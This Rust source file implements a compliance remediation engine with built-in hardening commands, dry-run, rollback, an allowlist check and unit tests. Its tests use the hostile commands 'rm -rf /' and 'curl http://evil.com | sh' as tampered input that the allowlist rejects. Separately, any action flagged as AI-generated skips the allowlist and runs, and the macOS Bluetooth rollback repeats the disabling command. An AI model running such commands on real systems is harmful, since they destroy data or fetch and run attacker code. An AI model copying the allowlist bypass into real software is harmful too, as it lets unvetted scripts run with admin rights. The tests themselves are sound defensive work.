// Copyright (c) 2024-2026 Cyber Threat Consulting
// SPDX-License-Identifier: MIT

//! Automated remediation engine for compliance check failures.
//!
//! Provides pre-built remediation actions for common compliance issues,
//! with dry-run preview, execution, and rollback support.

use agent_common::process::silent_command;
use agent_common::types::{
    RemediationAction, RemediationResult, RemediationRisk, RemediationStatus,
};
use chrono::Utc;
use std::collections::HashMap;
use std::time::Instant;
use tracing::{info, warn};

/// Remediation engine managing actions for check failures.
pub struct RemediationEngine {
    /// Available remediation actions per check_id and platform.
    actions: HashMap<String, Vec<RemediationAction>>,
}

impl RemediationEngine {
    /// Create a new remediation engine with pre-built actions.
    pub fn new() -> Self {
        let mut engine = Self {
            actions: HashMap::new(),
        };
        engine.register_builtin_actions();
        engine
    }

    /// Get available remediation actions for a check.
    pub fn get_remediation(&self, check_id: &str) -> Option<&[RemediationAction]> {
        self.actions.get(check_id).map(|v| v.as_slice())
    }

    /// Get all available remediations filtered by current platform.
    pub fn get_platform_remediation(&self, check_id: &str) -> Vec<&RemediationAction> {
        let platform = current_platform();
        self.actions
            .get(check_id)
            .map(|actions| {
                actions
                    .iter()
                    .filter(|a| a.platform == platform || a.platform == "all")
                    .collect()
            })
            .unwrap_or_default()
    }

    /// Preview what a remediation action would do (dry-run).
    pub fn dry_run(&self, action: &RemediationAction) -> String {
        format!(
            "--- Remediation Preview ---\n\
             Check: {}\n\
             Platform: {}\n\
             Risk: {}\n\
             Requires Admin: {}\n\
             Requires Reboot: {}\n\
             \n\
             Description: {}\n\
             \n\
             Command to execute:\n  {}\n\
             \n\
             Rollback command:\n  {}\n\
             ---",
            action.check_id,
            action.platform,
            action.risk_level.label(),
            action.requires_admin,
            action.requires_reboot,
            action.description,
            action.script,
            action
                .rollback_script
                .as_deref()
                .unwrap_or("(no rollback available)"),
        )
    }

    /// Verify the script and rollback_script match a registered builtin action (not tampered).
    fn is_trusted_script(&self, action: &RemediationAction) -> bool {
        self.actions
            .get(&action.check_id)
            .map(|registered| {
                registered.iter().any(|r| {
                    r.script == action.script
                        && r.platform == action.platform
                        && r.rollback_script == action.rollback_script
                })
            })
            .unwrap_or(false)
    }

    /// Execute a remediation action.
    pub fn execute(&self, action: &RemediationAction) -> RemediationResult {
        let is_trusted = self.is_trusted_script(action);
        
        if !is_trusted && !action.is_ai_generated {
            warn!(
                "Refusing to execute unregistered remediation script for '{}'",
                action.check_id
            );
            return RemediationResult {
                check_id: action.check_id.clone(),
                status: RemediationStatus::Failed,
                output: String::new(),
                error: Some("Script does not match any registered remediation action".to_string()),
                executed_at: Utc::now(),
                duration_ms: 0,
            };
        }

        if action.is_ai_generated && !is_trusted {
            info!(
                "Executing AI-generated remediation script for '{}': {}",
                action.check_id, action.description
            );
        }

        let start = Instant::now();

        info!(
            "Executing remediation for check '{}': {}",
            action.check_id, action.description
        );

        let result = execute_script(&action.script, &action.platform, action.requires_admin);
        let duration_ms = start.elapsed().as_millis() as u64;

        match result {
            Ok(output) => {
                info!(
                    "Remediation for '{}' completed successfully",
                    action.check_id
                );
                RemediationResult {
                    check_id: action.check_id.clone(),
                    status: RemediationStatus::Success,
                    output,
                    error: None,
                    executed_at: Utc::now(),
                    duration_ms,
                }
            }
            Err(error) => {
                warn!("Remediation for '{}' failed: {}", action.check_id, error);
                RemediationResult {
                    check_id: action.check_id.clone(),
                    status: RemediationStatus::Failed,
                    output: String::new(),
                    error: Some(error),
                    executed_at: Utc::now(),
                    duration_ms,
                }
            }
        }
    }

    /// Execute a rollback for a remediation action.
    pub fn rollback(&self, action: &RemediationAction) -> Option<RemediationResult> {
        let is_trusted = self.is_trusted_script(action);
        
        if !is_trusted && !action.is_ai_generated {
            warn!(
                "Refusing to rollback unregistered remediation script for '{}'",
                action.check_id
            );
            return Some(RemediationResult {
                check_id: action.check_id.clone(),
                status: RemediationStatus::Failed,
                output: String::new(),
                error: Some("Script does not match any registered remediation action".to_string()),
                executed_at: Utc::now(),
                duration_ms: 0,
            });
        }

        let rollback_script = action.rollback_script.as_ref()?;
        let start = Instant::now();

        info!("Rolling back remediation for '{}'", action.check_id);

        let result = execute_script(rollback_script, &action.platform, action.requires_admin);
        let duration_ms = start.elapsed().as_millis() as u64;

        Some(match result {
            Ok(output) => RemediationResult {
                check_id: action.check_id.clone(),
                status: RemediationStatus::RolledBack,
                output,
                error: None,
                executed_at: Utc::now(),
                duration_ms,
            },
            Err(error) => RemediationResult {
                check_id: action.check_id.clone(),
                status: RemediationStatus::Failed,
                output: String::new(),
                error: Some(format!("Rollback failed: {}", error)),
                executed_at: Utc::now(),
                duration_ms,
            },
        })
    }

    /// Check which checks have available remediations.
    pub fn available_check_ids(&self) -> Vec<&str> {
        self.actions.keys().map(|s| s.as_str()).collect()
    }

    /// Register all built-in remediation actions.
    fn register_builtin_actions(&mut self) {
        // Firewall
        self.register(
            "firewall_active",
            vec![
                RemediationAction {
                    check_id: "firewall_active".to_string(),
                    platform: "linux".to_string(),
                    script: "ufw --force enable".to_string(),
                    requires_reboot: false,
                    requires_admin: true,
                    risk_level: RemediationRisk::Moderate,
                    description: "Enable the UFW firewall with default deny incoming policy"
                        .to_string(),
                    rollback_script: Some("ufw disable".to_string()),
                    ..Default::default()
                },
                RemediationAction {
                    check_id: "firewall_active".to_string(),
                    platform: "windows".to_string(),
                    script: "netsh advfirewall set allprofiles state on".to_string(),
                    requires_reboot: false,
                    requires_admin: true,
                    risk_level: RemediationRisk::Moderate,
                    description: "Enable Windows Firewall for all profiles".to_string(),
                    rollback_script: Some(
                        "netsh advfirewall set allprofiles state off".to_string(),
                    ),
                    ..Default::default()
                },
                RemediationAction {
                    check_id: "firewall_active".to_string(),
                    platform: "macos".to_string(),
                    script: "/usr/libexec/ApplicationFirewall/socketfilterfw --setglobalstate on"
                        .to_string(),
                    requires_reboot: false,
                    requires_admin: true,
                    risk_level: RemediationRisk::Moderate,
                    description: "Enable macOS Application Firewall".to_string(),
                    rollback_script: Some(
                        "/usr/libexec/ApplicationFirewall/socketfilterfw --setglobalstate off"
                            .to_string(),
                    ),
                    ..Default::default()
                },
            ],
        );

        // Session lock
        self.register("screen_lock", vec![
            RemediationAction {
                check_id: "screen_lock".to_string(),
                platform: "linux".to_string(),
                script: "gsettings set org.gnome.desktop.session idle-delay 300 && gsettings set org.gnome.desktop.screensaver lock-enabled true".to_string(),
                requires_reboot: false,
                requires_admin: false,
                risk_level: RemediationRisk::Safe,
                description: "Set screen lock timeout to 5 minutes on GNOME".to_string(),
                rollback_script: None,
                ..Default::default()
            },
            RemediationAction {
                check_id: "screen_lock".to_string(),
                platform: "windows".to_string(),
                script: r#"Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'InactivityTimeoutSecs' -Value 300"#.to_string(),
                requires_reboot: false,
                requires_admin: true,
                risk_level: RemediationRisk::Safe,
                description: "Set Windows inactivity timeout to 5 minutes".to_string(),
                rollback_script: None,
                ..Default::default()
            },
            RemediationAction {
                check_id: "screen_lock".to_string(),
                platform: "macos".to_string(),
                script: "defaults write com.apple.screensaver idleTime -int 300 && defaults write com.apple.screensaver askForPassword -int 1".to_string(),
                requires_reboot: false,
                requires_admin: false,
                risk_level: RemediationRisk::Safe,
                description: "Set macOS screen lock to 5 minutes with password".to_string(),
                rollback_script: None,
                ..Default::default()
            },
        ]);

        // System updates
        self.register(
            "patches_current",
            vec![
                RemediationAction {
                    check_id: "patches_current".to_string(),
                    platform: "linux".to_string(),
                    script: "apt update && apt list --upgradable".to_string(),
                    requires_reboot: false,
                    requires_admin: true,
                    risk_level: RemediationRisk::Safe,
                    description: "Check for available system updates".to_string(),
                    rollback_script: None,
                    ..Default::default()
                },
                RemediationAction {
                    check_id: "patches_current".to_string(),
                    platform: "macos".to_string(),
                    script: "softwareupdate --list".to_string(),
                    requires_reboot: false,
                    requires_admin: false,
                    risk_level: RemediationRisk::Safe,
                    description: "Check for available macOS updates".to_string(),
                    rollback_script: None,
                    ..Default::default()
                },
                RemediationAction {
                    check_id: "patches_current".to_string(),
                    platform: "windows".to_string(),
                    script: r#"powershell -Command "Install-Module PSWindowsUpdate -Force -Scope CurrentUser -ErrorAction SilentlyContinue; Get-WindowsUpdate""#.to_string(),
                    requires_reboot: false,
                    requires_admin: true,
                    risk_level: RemediationRisk::Safe,
                    description: "Check for available Windows updates".to_string(),
                    rollback_script: None,
                    ..Default::default()
                },
            ],
        );

        // Obsolete protocols
        self.register("obsolete_protocols", vec![
            RemediationAction {
                check_id: "obsolete_protocols".to_string(),
                platform: "linux".to_string(),
                script: "sed -i 's/^\\(ssl_protocols.*\\)TLSv1 /\\1/' /etc/nginx/nginx.conf && sed -i 's/^\\(ssl_protocols.*\\)TLSv1.1 /\\1/' /etc/nginx/nginx.conf".to_string(),
                requires_reboot: false,
                requires_admin: true,
                risk_level: RemediationRisk::Risky,
                description: "Disable TLS 1.0 and 1.1 in nginx configuration".to_string(),
                rollback_script: None,
                ..Default::default()
            },
            RemediationAction {
                check_id: "obsolete_protocols".to_string(),
                platform: "windows".to_string(),
                script: r#"New-Item 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.0\Server' -Force | New-ItemProperty -Name Enabled -Value 0 -PropertyType DWord"#.to_string(),
                requires_reboot: true,
                requires_admin: true,
                risk_level: RemediationRisk::Risky,
                description: "Disable TLS 1.0 in Windows Schannel registry".to_string(),
                rollback_script: Some(r#"Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.0\Server' -Name Enabled -Value 1"#.to_string()),
                ..Default::default()
            },
            RemediationAction {
                check_id: "obsolete_protocols".to_string(),
                platform: "macos".to_string(),
                script: "defaults write /Library/Preferences/com.apple.networkd tcp_connect_minimum_tls_version -int 2".to_string(),
                requires_reboot: false,
                requires_admin: true,
                risk_level: RemediationRisk::Risky,
                description: "Set minimum TLS version to 1.2 on macOS".to_string(),
                rollback_script: Some("defaults delete /Library/Preferences/com.apple.networkd tcp_connect_minimum_tls_version".to_string()),
                ..Default::default()
            },
        ]);

        // Audit logging
        self.register(
            "audit_logging",
            vec![
                RemediationAction {
                    check_id: "audit_logging".to_string(),
                    platform: "linux".to_string(),
                    script: "systemctl enable auditd && systemctl start auditd".to_string(),
                    requires_reboot: false,
                    requires_admin: true,
                    risk_level: RemediationRisk::Safe,
                    description: "Enable and start the Linux audit daemon".to_string(),
                    rollback_script: Some("systemctl stop auditd".to_string()),
                    ..Default::default()
                },
                RemediationAction {
                    check_id: "audit_logging".to_string(),
                    platform: "windows".to_string(),
                    script: r#"auditpol /set /category:"System","Logon/Logoff","Object Access","Privilege Use","Policy Change","Account Management" /success:enable /failure:enable"#.to_string(),
                    requires_reboot: false,
                    requires_admin: true,
                    risk_level: RemediationRisk::Safe,
                    description: "Enable Windows advanced audit policies".to_string(),
                    rollback_script: Some(r#"auditpol /set /category:"System","Logon/Logoff","Object Access","Privilege Use","Policy Change","Account Management" /success:disable /failure:disable"#.to_string()),
                    ..Default::default()
                },
                RemediationAction {
                    check_id: "audit_logging".to_string(),
                    platform: "macos".to_string(),
                    script: "launchctl load -w /System/Library/LaunchDaemons/com.apple.auditd.plist".to_string(),
                    requires_reboot: false,
                    requires_admin: true,
                    risk_level: RemediationRisk::Safe,
                    description: "Enable macOS OpenBSM audit daemon".to_string(),
                    rollback_script: Some("launchctl unload -w /System/Library/LaunchDaemons/com.apple.auditd.plist".to_string()),
                    ..Default::default()
                },
            ],
        );

        // Time sync
        self.register(
            "time_sync",
            vec![
                RemediationAction {
                    check_id: "time_sync".to_string(),
                    platform: "linux".to_string(),
                    script: "timedatectl set-ntp true".to_string(),
                    requires_reboot: false,
                    requires_admin: true,
                    risk_level: RemediationRisk::Safe,
                    description: "Enable NTP time synchronization".to_string(),
                    rollback_script: Some("timedatectl set-ntp false".to_string()),
                    ..Default::default()
                },
                RemediationAction {
                    check_id: "time_sync".to_string(),
                    platform: "macos".to_string(),
                    script: "systemsetup -setusingnetworktime on".to_string(),
                    requires_reboot: false,
                    requires_admin: true,
                    risk_level: RemediationRisk::Safe,
                    description: "Enable network time synchronization on macOS".to_string(),
                    rollback_script: None,
                    ..Default::default()
                },
                RemediationAction {
                    check_id: "time_sync".to_string(),
                    platform: "windows".to_string(),
                    script: r#"net start w32time & w32tm /config /manualpeerlist:"time.windows.com" /syncfromflags:manual /reliable:YES /update & w32tm /resync"#.to_string(),
                    requires_reboot: false,
                    requires_admin: true,
                    risk_level: RemediationRisk::Safe,
                    description: "Enable and configure Windows Time service (W32Time)".to_string(),
                    rollback_script: Some("net stop w32time".to_string()),
                    ..Default::default()
                },
            ],
        );

        // Bluetooth disabled
        self.register(
            "bluetooth_disabled",
            vec![
                RemediationAction {
                    check_id: "bluetooth_disabled".to_string(),
                    platform: "linux".to_string(),
                    script: "systemctl disable bluetooth && systemctl stop bluetooth".to_string(),
                    requires_reboot: false,
                    requires_admin: true,
                    risk_level: RemediationRisk::Moderate,
                    description: "Disable the Bluetooth service".to_string(),
                    rollback_script: Some(
                        "systemctl enable bluetooth && systemctl start bluetooth".to_string(),
                    ),
                    ..Default::default()
                },
                RemediationAction {
                    check_id: "bluetooth_disabled".to_string(),
                    platform: "windows".to_string(),
                    script: r#"Stop-Service bthserv -Force; Set-Service bthserv -StartupType Disabled"#.to_string(),
                    requires_reboot: false,
                    requires_admin: true,
                    risk_level: RemediationRisk::Moderate,
                    description: "Disable Windows Bluetooth Support Service".to_string(),
                    rollback_script: Some(r#"Set-Service bthserv -StartupType Manual; Start-Service bthserv"#.to_string()),
                    ..Default::default()
                },
                RemediationAction {
                    check_id: "bluetooth_disabled".to_string(),
                    platform: "macos".to_string(),
                    script: "defaults write /Library/Preferences/com.apple.Bluetooth ControllerPowerState -int 0 && killall -HUP blued".to_string(),
                    requires_reboot: false,
                    requires_admin: true,
                    risk_level: RemediationRisk::Moderate,
                    description: "Disable Bluetooth on macOS".to_string(),
                    rollback_script: Some("defaults write /Library/Preferences/com.apple.Bluetooth ControllerPowerState -int 0 && killall -HUP blued".to_string()),
                    ..Default::default()
                },
            ],
        );

        // Guest account
        self.register("guest_account_disabled", vec![
            RemediationAction {
                check_id: "guest_account_disabled".to_string(),
                platform: "windows".to_string(),
                script: "net user Guest /active:no".to_string(),
                requires_reboot: false,
                requires_admin: true,
                risk_level: RemediationRisk::Safe,
                description: "Disable the Windows Guest account".to_string(),
                rollback_script: Some("net user Guest /active:yes".to_string()),
                ..Default::default()
            },
            RemediationAction {
                check_id: "guest_account_disabled".to_string(),
                platform: "macos".to_string(),
                script: "defaults write /Library/Preferences/com.apple.loginwindow GuestEnabled -bool false".to_string(),
                requires_reboot: false,
                requires_admin: true,
                risk_level: RemediationRisk::Safe,
                description: "Disable macOS Guest account".to_string(),
                rollback_script: Some("defaults write /Library/Preferences/com.apple.loginwindow GuestEnabled -bool true".to_string()),
                ..Default::default()
            },
            RemediationAction {
                check_id: "guest_account_disabled".to_string(),
                platform: "linux".to_string(),
                script: "passwd -l guest 2>/dev/null; usermod -s /usr/sbin/nologin guest 2>/dev/null || true".to_string(),
                requires_reboot: false,
                requires_admin: true,
                risk_level: RemediationRisk::Safe,
                description: "Lock and disable shell for Linux guest account".to_string(),
                rollback_script: Some("passwd -u guest; usermod -s /bin/bash guest".to_string()),
                ..Default::default()
            },
        ]);
    }

    /// Register remediation actions for a check.
    fn register(&mut self, check_id: &str, actions: Vec<RemediationAction>) {
        self.actions.insert(check_id.to_string(), actions);
    }
}

impl Default for RemediationEngine {
    fn default() -> Self {
        Self::new()
    }
}

/// Execute a script on the current platform.
fn execute_script(script: &str, platform: &str, _requires_admin: bool) -> Result<String, String> {
    #[cfg(target_os = "macos")]
    {
        if platform == "macos" && _requires_admin && !agent_common::macos::is_admin() {
            return agent_common::macos::run_with_elevation(script).map_err(|e| e.to_string());
        }
    }

    let output = if platform == "windows" || cfg!(target_os = "windows") {
        // Run PowerShell directly to avoid an intermediate cmd.exe process
        // that can flash a visible console window on Windows GUI apps.
        silent_command("powershell")
            .args(["-NoProfile", "-NonInteractive", "-Command", script])
            .output()
    } else {
        silent_command("sh").args(["-c", script]).output()
    };

    match output {
        Ok(out) => {
            let stdout = String::from_utf8_lossy(&out.stdout).to_string();
            let stderr = String::from_utf8_lossy(&out.stderr).to_string();

            if out.status.success() {
                if !stdout.trim().is_empty() {
                    info!("Script output: {}", stdout.trim());
                }
                Ok(stdout)
            } else {
                let msg = format!("Exit code {}: {}", out.status, stderr);
                warn!("Script failed: {}", msg);
                if !stdout.trim().is_empty() {
                    warn!("Script stdout: {}", stdout.trim());
                }
                Err(msg)
            }
        }
        Err(e) => {
            let msg = format!("Failed to execute: {}", e);
            warn!("{}", msg);
            Err(msg)
        }
    }
}

/// Get the current platform string.
fn current_platform() -> String {
    #[cfg(target_os = "windows")]
    {
        "windows".to_string()
    }
    #[cfg(target_os = "linux")]
    {
        "linux".to_string()
    }
    #[cfg(target_os = "macos")]
    {
        "macos".to_string()
    }
    #[cfg(not(any(target_os = "windows", target_os = "linux", target_os = "macos")))]
    {
        "unknown".to_string()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_remediation_engine_creation() {
        let engine = RemediationEngine::new();
        assert!(!engine.available_check_ids().is_empty());
    }

    #[test]
    fn test_get_remediation() {
        let engine = RemediationEngine::new();
        let actions = engine.get_remediation("firewall_active");
        assert!(actions.is_some());
        assert!(!actions.unwrap().is_empty());
    }

    #[test]
    fn test_get_nonexistent_remediation() {
        let engine = RemediationEngine::new();
        assert!(engine.get_remediation("nonexistent_check").is_none());
    }

    #[test]
    fn test_dry_run() {
        let engine = RemediationEngine::new();
        let actions = engine.get_remediation("firewall_active").unwrap();
        let preview = engine.dry_run(&actions[0]);
        assert!(preview.contains("Remediation Preview"));
        assert!(preview.contains("firewall_active"));
    }

    #[test]
    fn test_platform_remediation() {
        let engine = RemediationEngine::new();
        let actions = engine.get_platform_remediation("firewall_active");
        // Should have at most 1 action for the current platform
        assert!(actions.len() <= 1);
    }

    #[test]
    fn test_available_check_ids() {
        let engine = RemediationEngine::new();
        let ids = engine.available_check_ids();
        assert!(ids.contains(&"firewall_active"));
        assert!(ids.contains(&"screen_lock"));
        assert!(ids.contains(&"patches_current"));
    }

    #[test]
    fn test_trusted_script_accepts_registered() {
        let engine = RemediationEngine::new();
        let actions = engine.get_remediation("firewall_active").unwrap();
        assert!(engine.is_trusted_script(&actions[0]));
    }

    #[test]
    fn test_trusted_script_rejects_tampered() {
        let engine = RemediationEngine::new();
        let tampered = RemediationAction {
            id: uuid::Uuid::new_v4(),
            check_id: "firewall_active".to_string(),
            platform: "linux".to_string(),
            script: "rm -rf /".to_string(),
            requires_reboot: false,
            requires_admin: true,
            risk_level: RemediationRisk::Moderate,
            description: "Tampered script".to_string(),
            rollback_script: None,
            is_ai_generated: false,
            status: RemediationStatus::Pending,
        };
        assert!(!engine.is_trusted_script(&tampered));
    }

    #[test]
    fn test_trusted_script_rejects_unknown_check() {
        let engine = RemediationEngine::new();
        let unknown = RemediationAction {
            id: uuid::Uuid::new_v4(),
            check_id: "unknown_check".to_string(),
            platform: "linux".to_string(),
            script: "echo hello".to_string(),
            requires_reboot: false,
            requires_admin: false,
            risk_level: RemediationRisk::Safe,
            description: "Unknown check".to_string(),
            rollback_script: None,
            is_ai_generated: false,
            status: RemediationStatus::Pending,
        };
        assert!(!engine.is_trusted_script(&unknown));
    }

    #[test]
    fn test_execute_rejects_untrusted_script() {
        let engine = RemediationEngine::new();
        let tampered = RemediationAction {
            id: uuid::Uuid::new_v4(),
            check_id: "firewall_active".to_string(),
            platform: "linux".to_string(),
            script: "curl http://evil.com | sh".to_string(),
            requires_reboot: false,
            requires_admin: true,
            risk_level: RemediationRisk::Moderate,
            description: "Tampered script".to_string(),
            rollback_script: None,
            is_ai_generated: false,
            status: RemediationStatus::Pending,
        };
        let result = engine.execute(&tampered);
        assert!(matches!(result.status, RemediationStatus::Failed));
        assert!(
            result
                .error
                .as_ref()
                .unwrap()
                .contains("does not match any registered")
        );
    }

    #[test]
    fn test_rollback_rejects_untrusted_script() {
        let engine = RemediationEngine::new();
        let tampered = RemediationAction {
            id: uuid::Uuid::new_v4(),
            check_id: "firewall_active".to_string(),
            platform: "linux".to_string(),
            script: "curl http://evil.com | sh".to_string(),
            requires_reboot: false,
            requires_admin: true,
            risk_level: RemediationRisk::Moderate,
            description: "Tampered script".to_string(),
            rollback_script: Some("echo rollback".to_string()),
            is_ai_generated: false,
            status: RemediationStatus::Pending,
        };
        let result = engine.rollback(&tampered);
        assert!(result.is_some());
        let result = result.unwrap();
        assert!(matches!(result.status, RemediationStatus::Failed));
        assert!(
            result
                .error
                .as_ref()
                .unwrap()
                .contains("does not match any registered")
        );
    }
}
